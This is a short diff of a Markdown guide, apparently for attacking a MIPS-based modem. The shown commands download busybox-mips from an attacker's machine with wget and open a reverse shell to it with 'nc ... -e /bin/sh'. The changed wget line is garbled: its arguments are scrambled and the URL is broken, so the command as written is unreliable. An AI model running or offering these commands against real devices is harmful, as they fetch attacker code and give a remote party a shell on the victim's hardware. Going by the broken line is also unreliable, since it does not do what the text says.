@@ -43,16 +43,16 @@ rm -rf /var/tmp
 mkdir /var/tmp
 
 # Download busybox-mips from the attacker's machine
-wget -g -v -r http://<attacker-ip>:8000/busybox-mips -P /var/tmp
+wget -g -v -l busybox-mips -r /busybox-mips [attacker-ip] -P 8000
 
 # Grant execution permissions to busybox-mips
 chmod +x /var/tmp/busybox-mips
 
 # Start a reverse shell from the modem to the attacker's machine
-/var/tmp/busybox-mips nc <attacker-ip> 1234 -e /bin/sh
+/var/tmp/busybox-mips nc 192.168.1.2 1234 -e  /bin/sh
 ```
 
-Replace `<attacker-ip>` with the actual IP address of the attacker's machine.
+Replace `[attacker-ip]` with the actual IP address of the attacker's machine.
 
 ### Notes
 
